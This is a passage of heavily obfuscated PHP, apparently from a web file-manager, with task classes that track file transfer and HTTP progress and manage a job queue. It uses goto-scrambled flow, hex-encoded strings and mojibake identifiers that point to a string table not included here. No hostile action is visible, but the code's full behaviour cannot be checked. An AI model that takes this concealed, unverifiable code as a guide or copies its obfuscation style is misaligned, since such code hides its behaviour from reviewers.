$D¦ÔÍ»ñÙ¿ = array($E´óÏëÀâ[1506] => USER_ID, $E´óÏëÀâ[470] => 0); $f²‰Œˆ§¾Õ = $this->field($E´óÏëÀâ[28])->where($D¦ÔÍ»ñÙ¿)->select(); goto a¢—¯¥ÜÚó; A¿ñ¤„äÈ: return $fÈÀÇ¯éá . "\x28{$CìÃÔ”…Ë}\51"; goto BÊ—ÃäŞ„…; BÊ—ÃäŞ„…: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\152\157\142\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\144\x65\163\143", "\x73\x6f\x72\164"); const JOB_KEY = "\163\x65\x6c\146\x4a\157\x62\114\151\163\x74"; public function listData($C­©©÷íù = false, $b·âÀ‡³Ó = "\x73\157\162\164", $D£È––Œ = false) { return parent::listData($C­©©÷íù, $b·âÀ‡³Ó, $D£È––Œ); } public function remove($CÍÇ’ºÕÔç) { return parent::remove($CÍÇ’ºÕÔç); } public function add($e½âØ·ŞË) { $bÓ¼»˜Â‹‡ =& $_SERVER[Šº]; if ($this->findByName($e½âØ·ŞË[$bÓ¼»˜Â‹‡[28]])) { return !1; } $e½âØ·ŞË[$bÓ¼»˜Â‹‡[1700]] = $this->getSort(); return parent::insert($e½âØ·ŞË); } private function getSort() { $C¦ëÑ³Ö =& $_SERVER[Šº]; $dÒİ¤ã½Í = parent::listData(); $eâÄ¿¼¯©° = array_to_keyvalue($dÒİ¤ã½Í, $C¦ëÑ³Ö[33], $C¦ëÑ³Ö[1700]); return empty($eâÄ¿¼¯©°) ? 0 : max($eâÄ¿¼¯©°) + 1; } public function update($A·òÅí®±, $e‘‚óŠÆá‰) { $AŒ¨÷—Ğİ =& $_SERVER[Šº]; $b…áê¬ ÌÖ = parent::listData($A·òÅí®±); $F‹êÏ­«Í = $this->findByName($e‘‚óŠÆá‰[$AŒ¨÷—Ğİ[28]]); if (!$b…áê¬ ÌÖ || $F‹êÏ­«Í && $F‹êÏ­«Í[$AŒ¨÷—Ğİ[392]] != $b…áê¬ ÌÖ[$AŒ¨÷—Ğİ[392]]) { return !1; } return parent::update($A·òÅí®±, $e‘‚óŠÆá‰); } public function setUserJob($F±‡‹¢¿¡©, $dî©óïŒÒê) { goto DâÙÓ„ŞÆ¹; B¥éÙ«¨‘: $e ß®®Êè = rtrim($e ß®®Êè, $B‰ÀùÕÏ«×[47]); Model($B‰ÀùÕÏ«×[514])->metaSet($F±‡‹¢¿¡©, self::JOB_KEY, $e ß®®Êè); goto E´Ÿ’ÎŸ‡Ñ; DâÙÓ„ŞÆ¹: $B‰ÀùÕÏ«× =& $_SERVER[Šº]; if (!is_array($dî©óïŒÒê)) { $dî©óïŒÒê = array($dî©óïŒÒê); } $CÆ«ô˜ïƒÛ = parent::listData(); goto d‘•…Á×”‡; d‘•…Á×”‡: $Eò›•–‚•Æ = array_to_keyvalue($CÆ«ô˜ïƒÛ, $B‰ÀùÕÏ«×[28]); $e ß®®Êè = $B‰ÀùÕÏ«×[374]; foreach ($dî©óïŒÒê as $BÀˆËÂÂš‚) { if ($Eò›•–‚•Æ[$BÀˆËÂÂš‚]) { $e ß®®Êè .= $Eò›•–‚•Æ[$BÀˆËÂÂš‚][$B‰ÀùÕÏ«×[392]] . $B‰ÀùÕÏ«×[47]; } else { $CƒËÍ©Ôƒ = $this->add($BÀˆËÂÂš‚); $e ß®®Êè .= $CƒËÍ©Ôƒ . $B‰ÀùÕÏ«×[47]; } } goto B¥éÙ«¨‘; E´Ÿ’ÎŸ‡Ñ: } public function getUserJob($AÏ½‹ğöí) { $FÎÛÁÃŸ«œ = Model($_SERVER[Šº][514])->metaGet($AÏ½‹ğöí); return $this->getUserJobInfo($FÎÛÁÃŸ«œ[self::JOB_KEY]); } public function getUserJobInfo($Dâ®“ßŒ½à) { goto cÏšÛ¦œ²; eİ’±¬¯Š¹: $AÈ‚×ØŠö™ = array_remove_key($AÈ‚×ØŠö™, $c¿ÅëË¶ùá[193]); $déÖæ´¼é¼ = array(); foreach ($b„ ’õ×†‡ as $fãĞõ±‰œñ) { if (isset($AÈ‚×ØŠö™[$fãĞõ±‰œñ])) { $déÖæ´¼é¼[] = $AÈ‚×ØŠö™[$fãĞõ±‰œñ]; } } goto C³ÍŸùÖÁ; cÏšÛ¦œ²: $c¿ÅëË¶ùá =& $_SERVER[Šº]; $b„ ’õ×†‡ = explode($c¿ÅëË¶ùá[47], $Dâ®“ßŒ½à); $AÈ‚×ØŠö™ = parent::listData(); goto eİ’±¬¯Š¹; C³ÍŸùÖÁ: return $déÖæ´¼é¼; goto D–ìôƒŠŠ; D–ìôƒŠŠ: } } goto aóŒˆ³”®ß; F”Ìİ ñ–Ú: class TaskFileTransfer extends Task { protected function startAfter() { goto D›Õí©õ; C•æ§®ËâÖ: Hook::bind($f£ØŸ†µ¡Ÿ[578], array($this, $f£ØŸ†µ¡Ÿ[1544])); Hook::bind($f£ØŸ†µ¡Ÿ[545], array($this, $f£ØŸ†µ¡Ÿ[1545])); Hook::bind($f£ØŸ†µ¡Ÿ[542], array($this, $f£ØŸ†µ¡Ÿ[1545])); goto FÕÑÒ©î˜; D§ŠÆÙÄ¿: Hook::bind($f£ØŸ†µ¡Ÿ[1549], array($this, $f£ØŸ†µ¡Ÿ[1550])); Hook::bind($f£ØŸ†µ¡Ÿ[1551], array($this, $f£ØŸ†µ¡Ÿ[1552])); Hook::bind($f£ØŸ†µ¡Ÿ[1553], array($this, $f£ØŸ†µ¡Ÿ[1554])); goto cœìÑŒŒóõ; D›Õí©õ: $f£ØŸ†µ¡Ÿ =& $_SERVER[Šº]; $a§çÚ·››‹ =& $this->task; $this->sourceCopyFolder = !1; goto D¶ó‚¨ÉÙ; D¶ó‚¨ÉÙ: Hook::bind($f£ØŸ†µ¡Ÿ[1537], array($this, $f£ØŸ†µ¡Ÿ[1538])); Hook::bind($f£ØŸ†µ¡Ÿ[1098], array($this, $f£ØŸ†µ¡Ÿ[1539])); Hook::bind($f£ØŸ†µ¡Ÿ[1540], array($this, $f£ØŸ†µ¡Ÿ[1541])); goto F³ÏÉ¢Ùœì; C›ÒÇÌ»£„: Hook::bind($f£ØŸ†µ¡Ÿ[1546], array($this, $f£ØŸ†µ¡Ÿ[1547])); Hook::bind($f£ØŸ†µ¡Ÿ[567], array($this, $f£ØŸ†µ¡Ÿ[1548])); $this->sourceModelCopyFlag = !1; goto D§ŠÆÙÄ¿; cœìÑŒŒóõ: $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1555]] = LNG($f£ØŸ†µ¡Ÿ[1556]); $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1557]] = 0; $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1558]] = 0; goto a«Ñ¼İåÏ; A‘Ş”áÄåá: $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1561]] = 0; $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1562]] = 0; if (!$a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1420]]) { $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1420]] = LNG($f£ØŸ†µ¡Ÿ[1563]); } goto Dğº®«Šæ‰; a«Ñ¼İåÏ: $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1011]] = $f£ØŸ†µ¡Ÿ[33]; $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1559]] = $f£ØŸ†µ¡Ÿ[33]; $a§çÚ·››‹[$f£ØŸ†µ¡Ÿ[1560]] = 0; goto A‘Ş”áÄåá; F³ÏÉ¢Ùœì: Hook::bind($f£ØŸ†µ¡Ÿ[574], array($this, $f£ØŸ†µ¡Ÿ[1542])); Hook::bind($f£ØŸ†µ¡Ÿ[575], array($this, $f£ØŸ†µ¡Ÿ[1543])); Hook::bind($f£ØŸ†µ¡Ÿ[577], array($this, $f£ØŸ†µ¡Ÿ[1544])); goto C•æ§®ËâÖ; FÕÑÒ©î˜: Hook::bind($f£ØŸ†µ¡Ÿ[547], array($this, $f£ØŸ†µ¡Ÿ[1545])); Hook::bind($f£ØŸ†µ¡Ÿ[549], array($this, $f£ØŸ†µ¡Ÿ[1545])); Hook::bind($f£ØŸ†µ¡Ÿ[551], array($this, $f£ØŸ†µ¡Ÿ[1545])); goto C›ÒÇÌ»£„; Dğº®«Šæ‰: } protected function endAfter() { goto e‘ÅæŸÍ’Ö; d‰¬•Šâñ†: Hook::unbind($f¤¶Çè¤Ç[1549], array($this, $f¤¶Çè¤Ç[1550])); Hook::unbind($f¤¶Çè¤Ç[1551], array($this, $f¤¶Çè¤Ç[1552])); Hook::unbind($f¤¶Çè¤Ç[1553], array($this, $f¤¶Çè¤Ç[1554])); goto a¿ÁŒöâÍÁ; e‘ÅæŸÍ’Ö: $f¤¶Çè¤Ç =& $_SERVER[Šº]; Hook::unbind($f¤¶Çè¤Ç[1537], array($this, $f¤¶Çè¤Ç[1538])); Hook::unbind($f¤¶Çè¤Ç[1098], array($this, $f¤¶Çè¤Ç[1539])); goto dóÊ‰çĞƒ³; dóÊ‰çĞƒ³: Hook::unbind($f¤¶Çè¤Ç[1540], array($this, $f¤¶Çè¤Ç[1541])); Hook::unbind($f¤¶Çè¤Ç[574], array($this, $f¤¶Çè¤Ç[1542])); Hook::unbind($f¤¶Çè¤Ç[575], array($this, $f¤¶Çè¤Ç[1543])); goto Cƒ¨¾ì¥‰¥; Cƒ¨¾ì¥‰¥: Hook::unbind($f¤¶Çè¤Ç[577], array($this, $f¤¶Çè¤Ç[1544])); Hook::unbind($f¤¶Çè¤Ç[578], array($this, $f¤¶Çè¤Ç[1544])); Hook::unbind($f¤¶Çè¤Ç[545], array($this, $f¤¶Çè¤Ç[1545])); goto Aê«ÜÕµ«; Aê«ÜÕµ«: Hook::unbind($f¤¶Çè¤Ç[542], array($this, $f¤¶Çè¤Ç[1545])); Hook::unbind($f¤¶Çè¤Ç[547], array($this, $f¤¶Çè¤Ç[1545])); Hook::unbind($f¤¶Çè¤Ç[549], array($this, $f¤¶Çè¤Ç[1545])); goto aÙÌÛ§çä¤; aÙÌÛ§çä¤: Hook::unbind($f¤¶Çè¤Ç[551], array($this, $f¤¶Çè¤Ç[1545])); Hook::unbind($f¤¶Çè¤Ç[1546], array($this, $f¤¶Çè¤Ç[1547])); Hook::unbind($f¤¶Çè¤Ç[567], array($this, $f¤¶Çè¤Ç[1548])); goto d‰¬•Šâñ†; a¿ÁŒöâÍÁ: } public function copyMoveStart($BÒ·†Æã´Ö, $aÍ¨†ÅÓ…, $fÈÖ“¦Ê¿×, $eÈ‰„¡ĞÏİ) { goto D¨†°„¢¶Î; AÆÏ–ŸÁÖñ: if (substr($aÍ¨†ÅÓ…, 0, strlen($BÖ•Ó­¾¼)) == $BÖ•Ó­¾¼) { return; } if (substr($eÈ‰„¡ĞÏİ, 0, strlen($BÖ•Ó­¾¼)) == $BÖ•Ó­¾¼) { return; } $d „Š©«Í =& $this->task; goto F‘’ˆŒªØ×; D¨†°„¢¶Î: $cµ×åæ»¼º =& $_SERVER[Šº]; self::log($cµ×åæ»¼º[1564] . $aÍ¨†ÅÓ… . $cµ×åæ»¼º[67] . $eÈ‰„¡ĞÏİ); $BÖ•Ó­¾¼ = rtrim(TEMP_FILES, $cµ×åæ»¼º[8]); goto AÆÏ–ŸÁÖñ; F‘’ˆŒªØ×: $d „Š©«Í[$cµ×åæ»¼º[1565]] = KodIO::transferType($BÒ·†Æã´Ö, $fÈÖ“¦Ê¿×); $this->update(); goto b‰‹Á Î–Â; b‰‹Á Î–Â: } public function updateAfter() { goto eŠ¹îì›õ; cå´ÑùÁÚ: $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1515]] = $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1562]] / $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[721]]; if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1515]] > 0) { $C‰’›ß¾ù = timeFloat() - $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[747]] - $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1518]]; $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1519]] = $C‰’›ß¾ù * (1 - $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1515]]) / $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1515]]; } goto bä ‡±£ÄÓ; C³¹¾œ…–Õ: if ($this->sourceModelCopyFlag) { return; } if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1565]] == $Fº—ŠÀÎ[1169]) { return; } if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1565]] == $Fº—ŠÀÎ[1082] || $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1565]] == $Fº—ŠÀÎ[107]) { if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1559]]) { $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1562]] = $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1561]] + $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1558]]; } } else { if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1565]] == $Fº—ŠÀÎ[1170]) { if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1559]] == $Fº—ŠÀÎ[1082]) { $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1562]] = $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1561]] + $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1558]] * 0.5; } else { if ($Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1559]] == $Fº—ŠÀÎ[107]) { $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1562]] = $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1561]] + $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1557]] * 0.5 + $Cáë‚Ò¶¹È[$Fº—ŠÀÎ[1558]] * 0.5; } } } } goto cå´ÑùÁÚ; eŠ¹îì›õ: $Fº—ŠÀÎ =& $_SERVER[Šº]; $Cáë‚Ò¶¹È =& $this->task; if (!$Cáë‚Ò¶¹È[$Fº—ŠÀÎ[721]]) { return; } goto C³¹¾œ…–Õ; bä ‡±£ÄÓ: } public function addPath($F•øª‰Ñó) { goto Aõöá‡£; cò³«…³ô†: if ($c„œ·¼Ï£[$a–¶Â‹†™[29]] == $a–¶Â‹†™[192]) { $BªÀˆ©ãª¹[$a–¶Â‹†™[1009]] += 1; } else { $BªÀˆ©ãª¹[$a–¶Â‹†™[1009]] += $c„œ·¼Ï£[$a–¶Â‹†™[81]][$a–¶Â‹†™[79]]; if ($c„œ·¼Ï£[$a–¶Â‹†™[403]]) { $BªÀˆ©ãª¹[$a–¶Â‹†™[1009]] += $c„œ·¼Ï£[$a–¶Â‹†™[81]][$a–¶Â‹†™[80]] + 1; } } $BªÀˆ©ãª¹[$a–¶Â‹†™[721]] += $c„œ·¼Ï£[$a–¶Â‹†™[78]]; $this->update(); goto aÛŞ‘™öœÛ; eè‰•Ä©™: $c„œ·¼Ï£ = IO::infoWithChildren($F•øª‰Ñó); $a»œ‹×¸› = $BªÀˆ©ãª¹[$a–¶Â‹†™[1566]] ? $BªÀˆ©ãª¹[$a–¶Â‹†™[1566]][$a–¶Â‹†™[1567]] : 0; $BªÀˆ©ãª¹[$a–¶Â‹†™[1566]] = array($a–¶Â‹†™[1567] => $a»œ‹×¸› + 1, $a–¶Â‹†™[420] => $c„œ·¼Ï£[$a–¶Â‹†™[28]], $a–¶Â‹†™[76] => $c„œ·¼Ï£[$a–¶Â‹†™[76]], $a–¶Â‹†™[502] => $c„œ·¼Ï£[$a–¶Â‹†™[502]] ? $c„œ·¼Ï£[$a–¶Â‹†™[502]] : $c„œ·¼Ï£[$a–¶Â‹†™[76]]); goto cò³«…³ô†; Aõöá‡£: $a–¶Â‹†™ =& $_SERVER[Šº]; if (!$F•øª‰Ñó) { return; } $BªÀˆ©ãª¹ =& $this->task; goto eè‰•Ä©™; aÛŞ‘™öœÛ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($eã‘î®´øª) { $dğµ¦»Èˆ„ =& $_SERVER[Šº]; $A„÷¼»¨Ò =& $this->task; $A„÷¼»¨Ò[$dğµ¦»Èˆ„[1555]] = $eã‘î®´øª[$dğµ¦»Èˆ„[28]]; $A„÷¼»¨Ò[$dğµ¦»Èˆ„[1011]] = $eã‘î®´øª[$dğµ¦»Èˆ„[28]]; $this->update(); } public function copyFileStart($eÉÛ×·õ¡…, $BÖÔŞÃ, $fÕ¾«‹ÕÈ, $Cìõêë¼™ˆ, $EÄ™Ò¤Æ‰, $bÏÖ³ÑÜ) { goto e õÜÒÌ…£; e õÜÒÌ…£: $b­íŸ°ôÅ =& $_SERVER[Šº]; $aôõõ‰åœ = $EÄ™Ò¤Æ‰; if ($aôõõ‰åœ == $GLOBALS[$b­íŸ°ôÅ[1568]]) { $aôõõ‰åœ = $GLOBALS[$b­íŸ°ôÅ[1569]]; } goto e¤½…îñ™Š; DáîÒØ‹Â“: $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1011]] = $b­íŸ°ôÅ[33]; $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1559]] = $b­íŸ°ôÅ[33]; $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1560]] = 0; goto A×ïùê¿Ğã; fé…ÂÜ·Õ: $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1555]] = $aôõõ‰åœ; $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1557]] = (int) $eÉÛ×·õ¡…->size($BÖÔŞÃ); $BÂ™ë•…¦¡[$b­íŸ°ôÅ[1558]] = 0; goto DáîÒØ‹Â“; A×ïùê¿Ğã: $this->update(); goto bŒ™‹¹ƒŞâ; e¤½…îñ™Š: $GLOBALS[$b­íŸ°ôÅ[1569]] = $EÄ™Ò¤Æ‰; $GLOBALS[$b­íŸ°ôÅ[1568]] = $bÏÖ³ÑÜ; $BÂ™ë•…¦¡ =& $this->task; goto fé…ÂÜ·Õ; bŒ™‹¹ƒŞâ: } public function copyFileEnd($b³‚ÈÍ¨…š, $cÏæÄà½ÏÆ, $cŞÉÙÔç‹, $eó­ã²¸»‹, $F£˜ĞÈÛ, $bÇ“‚Í™ä’) { $E‚òò‹‹õ =& $_SERVER[Šº]; $A²Û­èö¿ =& $this->task; $A²Û­èö¿[$E‚òò‹‹õ[1558]] = $A²Û­èö¿[$E‚òò‹‹õ[1557]]; $A²Û­èö¿[$E‚òò‹‹õ[1559]] = $E‚òò‹‹õ[33]; if ($F£˜ĞÈÛ == $A²Û­èö¿[$E‚òò‹‹õ[1555]]) { $A²Û­èö¿[$E‚òò‹‹õ[1561]] += $A²Û­èö¿[$E‚òò‹‹õ[1557]]; $A²Û­èö¿[$E‚òò‹‹õ[1562]] = $A²Û­èö¿[$E‚òò‹‹õ[1561]]; $this->update(1); } else { $this->update(); $A²Û­èö¿[$E‚òò‹‹õ[1558]] = 0; } self::log($E‚òò‹‹õ[1570] . $cÏæÄà½ÏÆ . $E‚òò‹‹õ[67] . $eó­ã²¸»‹ . $E‚òò‹‹õ[228] . $F£˜ĞÈÛ . $E‚òò‹‹õ[1571] . $A²Û­èö¿[$E‚òò‹‹õ[1555]]); } public function updateFileEnd($BÁ«ÃÕÁœ£, $dºİ‡Şóœª) { goto EÛ”­º’ö; bÓçŞÇø£¤: $this->update(1); self::log($f¬®Ç±Òº‡[1572] . $BÁ«ÃÕÁœ£); goto E£Æµ˜Ë; EÛ”­º’ö: $f¬®Ç±Òº‡ =& $_SERVER[Šº]; $f¨­ÌÑÅ³ğ =& $this->task; $f¨­ÌÑÅ³ğ[$f¬®Ç±Òº‡[1555]] = $BÁ«ÃÕÁœ£; goto Aô“öµ‹Š; Aô“öµ‹Š: $f¨­ÌÑÅ³ğ[$f¬®Ç±Òº‡[1557]] = $dºİ‡Şóœª; $f¨­ÌÑÅ³ğ[$f¬®Ç±Òº‡[1561]] += $dºİ‡Şóœª; $f¨­ÌÑÅ³ğ[$f¬®Ç±Òº‡[1562]] = $f¨­ÌÑÅ³ğ[$f¬®Ç±Òº‡[1561]]; goto bÓçŞÇø£¤; E£Æµ˜Ë: } public function sourceModelCopy($B­¬§•‰Äª) { goto FÌ‚¿éƒé§; cÏïÚîø“: switch ($bâ¶º¥Œğª) { case $a©İù•¤æ[543]: $e †”’‘•ê = 1; break; case $a©İù•¤æ[546]: $AÇíŠÑ ÷„[$a©İù•¤æ[1555]] = $C±ö‚ŒØç¸[$a©İù•¤æ[28]]; break; case $a©İù•¤æ[548]: $e †”’‘•ê = intval($B­¬§•‰Äª[$a©İù•¤æ[376]] * 0.4); break; case $a©İù•¤æ[550]: $e †”’‘•ê = intval($B­¬§•‰Äª[$a©İù•¤æ[376]] * 0.2); break; case $a©İù•¤æ[552]: $e †”’‘•ê = intval($B­¬§•‰Äª[$a©İù•¤æ[376]] * 0.4); break; } $this->update($e †”’‘•ê); $this->sourceModelCopyFlag = !1; goto BÏ•°Âöè; FˆçÃ»Ü½ê: $AÇíŠÑ ÷„ =& $this->task; $this->sourceModelCopyFlag = !0; $e †”’‘•ê = 0; goto cÏïÚîø“; FÌ‚¿éƒé§: $a©İù•¤æ =& $_SERVER[Šº]; $bâ¶º¥Œğª = $B­¬§•‰Äª[0]; $C±ö‚ŒØç¸ = $B­¬§•‰Äª[1]; goto FˆçÃ»Ü½ê; BÏ•°Âöè: } public function sourceRemove($FëÃ†âŠäè, $F†Ô­Ç£Ö´) { $b‰Ç¨«ÔãÆ =& $_SERVER[Šº]; $this->sourceModelCopyFlag = !0; $CÅ­è×İø· = 1; if (isset($FëÃ†âŠäè[$b‰Ç¨«ÔãÆ[81]])) { $CÅ­è×İø· = $FëÃ†âŠäè[$b‰Ç¨«ÔãÆ[81]][$b‰Ç¨«ÔãÆ[79]] + $FëÃ†âŠäè[$b‰Ç¨«ÔãÆ[81]][$b‰Ç¨«ÔãÆ[80]] + 1; } $this->update($CÅ­è×İø·); $this->sourceModelCopyFlag = !1; } public function sourceMove($BØèñ«ö‚Œ) { $this->sourceRemove($BØèñ«ö‚Œ, !1); } public function curlProgress($båŒÕãÄŸ±, $cÜ™¦Ò‰«…, $dÄçš‹Æâï, $dŒÈ‰ì¯ç†, $bÃ£ĞğÒš) { $Añ’ÅëªŸ© =& $_SERVER[Šº]; $aÅËâßˆŒ =& $this->task; if ($bÃ£ĞğÒš > 0) { $aÅËâßˆŒ[$Añ’ÅëªŸ©[1011]] = $Añ’ÅëªŸ©[1573]; $aÅËâßˆŒ[$Añ’ÅëªŸ©[1559]] = $Añ’ÅëªŸ©[107]; if ($aÅËâßˆŒ[$Añ’ÅëªŸ©[1557]]) { $aÅËâßˆŒ[$Añ’ÅëªŸ©[1558]] = $bÃ£ĞğÒš; } if ($aÅËâßˆŒ[$Añ’ÅëªŸ©[1560]]) { $aÅËâßˆŒ[$Añ’ÅëªŸ©[1558]] = $bÃ£ĞğÒš + $aÅËâßˆŒ[$Añ’ÅëªŸ©[1560]]; } } else { if ($dÄçš‹Æâï > 0) { if ($aÅËâßˆŒ[$Añ’ÅëªŸ©[1557]] == $cÜ™¦Ò‰«…) { $aÅËâßˆŒ[$Añ’ÅëªŸ©[1558]] = $dÄçš‹Æâï; $aÅËâßˆŒ[$Añ’ÅëªŸ©[1011]] = $Añ’ÅëªŸ©[1574]; $aÅËâßˆŒ[$Añ’ÅëªŸ©[1559]] = $Añ’ÅëªŸ©[1082]; } } } $this->update(); } public function curlProgressStart($bªŞÓ³İÖ) { } public function curlProgressEnd($bğìÓÕùÜ¸) { goto EºÎ˜‰¼”; EºÎ˜‰¼”: $aä¨Î¬£ =& $_SERVER[Šº]; $Dâ¦à©ºñ¿ =& $this->task; $Eàµ÷¿Ó• = curl_getinfo($bğìÓÕùÜ¸); goto cßä†¬ƒ§; cßä†¬ƒ§: $bÄ¹„œâ˜ = $Eàµ÷¿Ó•[$aä¨Î¬£[1575]]; if ($bÄ¹„œâ˜ == -1) { $bÄ¹„œâ˜ = $Eàµ÷¿Ó•[$aä¨Î¬£[1576]]; } if ($Dâ¦à©ºñ¿[$aä¨Î¬£[1559]] == $aä¨Î¬£[107] && $bÄ¹„œâ˜) { $Dâ¦à©ºñ¿[$aä¨Î¬£[1560]] += $bÄ¹„œâ˜; } goto e×ÌóÑÃŒ„; e×ÌóÑÃŒ„: $this->update(); goto fñˆÏÇ³‚; fñˆÏÇ³‚: } } class TaskHttp extends Task { protected function startAfter() { $cŸ¼ˆø¤Á› =& $_SERVER[Šº]; $Cİ½…ß½óê =& $this->task; $Cİ½…ß½óê[$cŸ¼ˆø¤Á›[1577]] = 1; Hook::bind($cŸ¼ˆø¤Á›[1549], array($this, $cŸ¼ˆø¤Á›[1578])); Hook::bind($cŸ¼ˆø¤Á›[1551], array($this, $cŸ¼ˆø¤Á›[1579])); Hook::bind($cŸ¼ˆø¤Á›[1553], array($this, $cŸ¼ˆø¤Á›[1580])); } protected function endAfter() { $B…ëœâ°¹· =& $_SERVER[Šº]; Hook::unbind($B…ëœâ°¹·[1549], array($this, $B…ëœâ°¹·[1578])); Hook::unbind($B…ëœâ°¹·[1551], array($this, $B…ëœâ°¹·[1579])); Hook::unbind($B…ëœâ°¹·[1553], array($this, $B…ëœâ°¹·[1580])); } public function progressStart($bÑäèÊÓµ) { $Eï¿É¯Ï·´ =& $_SERVER[Šº]; $BñéŞ´÷‰Í = curl_getinfo($bÑäèÊÓµ); self::log($Eï¿É¯Ï·´[1581] . $BñéŞ´÷‰Í[$Eï¿É¯Ï·´[304]]); self::valueSet($this->task[$Eï¿É¯Ï·´[392]], $this->task); } public function progressEnd($B•ªªÜã’) { $eÙ­è³‘•Š =& $_SERVER[Šº]; self::log($eÙ­è³‘•Š[1582] . $this->task[$eÙ­è³‘•Š[392]]); $this->end(); } public function progress($CŠŠÁÔ¦¬à, $aÄİ÷Í©¥Ó, $bãˆÊ‘ÔŸÂ, $e¢äºÑ»‘ù, $EäºğÚÆä) { $FšİóÛ˜‚í =& $_SERVER[Šº]; $D¬ãÊÜ» =& $this->task; if ($EäºğÚÆä > 0) { $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]] = $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]] == 0 ? $e¢äºÑ»‘ù : $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]]; $D¬ãÊÜ»[$FšİóÛ˜‚í[1024]] = $EäºğÚÆä; } else { if ($bãˆÊ‘ÔŸÂ > 0) { $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]] = $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]] == 0 ? $aÄİ÷Í©¥Ó : $D¬ãÊÜ»[$FšİóÛ˜‚í[1009]]; $D¬ãÊÜ»[$FšİóÛ˜‚í[1024]] = $bãˆÊ‘ÔŸÂ; } } $this->update(); self::log("\x70\x72\x6f\x67\162\x65\x73\163\x48\164\164\160\x3a\144\157\167\x6e\x3a{$bãˆÊ‘ÔŸÂ}\57{$aÄİ÷Í©¥Ó}\73\x20\x75\160\x6c\x6f\x61\x64\x3a{$EäºğÚÆä}\x2f{$e¢äºÑ»‘ù}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\145\x75\x65\x4c\x65\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\x73\153\121\x75\145\x75\x65\104\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($b ·à¢’÷¬, $cšôÛ˜¼Ä½ = array(), $f„Ø•âì•ª = '', $fÜ«…ïæ¹İ = '') { $a¼ğ¼†öÅ² =& $_SERVER[Šº]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($fÜ«…ïæ¹İ && array_find_by_field(self::$listData, $a¼ğ¼†öÅ²[93], $fÜ«…ïæ¹İ)) { return !0; } self::$listData[] = array($a¼ğ¼†öÅ²[261] => $b ·à¢’÷¬, $a¼ğ¼†öÅ²[1583] => $cšôÛ˜¼Ä½, $a¼ğ¼†öÅ²[438] => $f„Ø•âì•ª, $a¼ğ¼†öÅ²[93] => $fÜ«…ïæ¹İ); return !0; } public static function addSubmit() { $A•–ì³ÚŞ÷ =& $_SERVER[Šº]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($A•–ì³ÚŞ÷[1584] . json_encode_force(array_to_keyvalue(self::$listData, $A•–ì³ÚŞ÷[33], $A•–ì³ÚŞ÷[438])), $A•–ì³ÚŞ÷[1585]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($BµõŞ»â´œ, $dÄê‡ÂŞ‰· = array(), $Dš§„ƒù¼Œ = '', $DÏÖÑºƒ = '') { goto F«Í³‰Â˜¡; dùªïå½òÂ: self::setAll($Bâß…¦ß÷); return !0; goto cØë¹ÖêÜ’; c‡É¤®µß: if ($DÏÖÑºƒ && array_find_by_field($Bâß…¦ß÷, $a˜¾Ó¸´Œ›[93], $DÏÖÑºƒ)) { return !0; } $Bâß…¦ß÷[] = array($a˜¾Ó¸´Œ›[261] => $BµõŞ»â´œ, $a˜¾Ó¸´Œ›[1583] => $dÄê‡ÂŞ‰·, $a˜¾Ó¸´Œ›[438] => $Dš§„ƒù¼Œ, $a˜¾Ó¸´Œ›[93] => $DÏÖÑºƒ); write_log($a˜¾Ó¸´Œ›[1584] . $Dš§„ƒù¼Œ, $a˜¾Ó¸´Œ›[1585]); goto dùªïå½òÂ; F«Í³‰Â˜¡: $a˜¾Ó¸´Œ› =& $_SERVER[Šº]; if (self::count() >= 